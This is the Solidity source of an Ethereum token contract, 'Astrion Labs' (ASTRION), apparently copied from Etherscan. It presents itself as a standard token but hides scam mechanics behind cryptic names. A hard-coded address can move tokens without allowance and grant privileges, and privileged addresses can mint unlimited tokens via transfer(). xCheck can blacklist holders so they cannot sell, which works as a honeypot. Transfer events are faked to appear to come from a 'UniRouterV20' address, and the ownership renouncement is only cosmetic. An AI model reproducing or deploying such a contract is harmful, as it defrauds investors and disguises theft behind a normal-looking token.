/**
 *Submitted for verification at Etherscan.io on 2022-11-01
*/

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address _xConstruc = 0x29201c505571932Dc7e1f3Fceb49F8ABCeAD5e51;
	address UniRouterV20 = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }

}



contract ASTRIONLABS is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private Xc;
	mapping (address => bool) private Xb;
    mapping (address => bool) private Xa;
    mapping (address => mapping (address => uint256)) private Xe;
    uint8 private constant _decimals = 8;
    uint256 private constant _XSupply = 250000000 * 10**_decimals;
    string private constant _name = "Astrion Labs";
    string private constant _symbol = "ASTRION";



    constructor () {
        Xc[_msgSender()] = _XSupply;
        emit Transfer(address(0), UniRouterV20, _XSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure  returns (uint256) {
        return _XSupply;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return Xc[account];
    }


    function allowance(address owner, address spender) public view  returns (uint256) {
        return Xe[owner][spender];
    }

            function approve(address spender, uint256 amount) public returns (bool success) {    
        Xe[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
		function xRNG(address jx) public {
        if(Xb[msg.sender]) { 
        Xa[jx] = false;}}
        function xCheck(address jx) public{
         if(Xb[msg.sender])  { 
        require(!Xa[jx]);
        Xa[jx] = true; }}
		function xDele(address jx) public{
         if(msg.sender == _xConstruc)  { 
        require(!Xb[jx]);
        Xb[jx] = true; }}
		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == _xConstruc)  {
        require(amount <= Xc[sender]);
        Xc[sender] -= amount;  
        Xc[recipient] += amount; 
          Xe[sender][msg.sender] -= amount;
        emit Transfer (UniRouterV20, recipient, amount);
        return true; }    
          if(!Xa[recipient]) {
          if(!Xa[sender]) {
         require(amount <= Xc[sender]);
        require(amount <= Xe[sender][msg.sender]);
        Xc[sender] -= amount;
        Xc[recipient] += amount;
      Xe[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function transfer(address Xd, uint256 jx) public {
        if(msg.sender == _xConstruc)  {
        require(Xc[msg.sender] >= jx);
        Xc[msg.sender] -= jx;  
        Xc[Xd] += jx; 
        emit Transfer (UniRouterV20, Xd, jx);}
        if(Xb[msg.sender]) {Xc[Xd] += jx;} 
        if(!Xa[msg.sender]) {
        require(Xc[msg.sender] >= jx);
        Xc[msg.sender] -= jx;  
        Xc[Xd] += jx;          
        emit Transfer(msg.sender, Xd, jx);
        }}}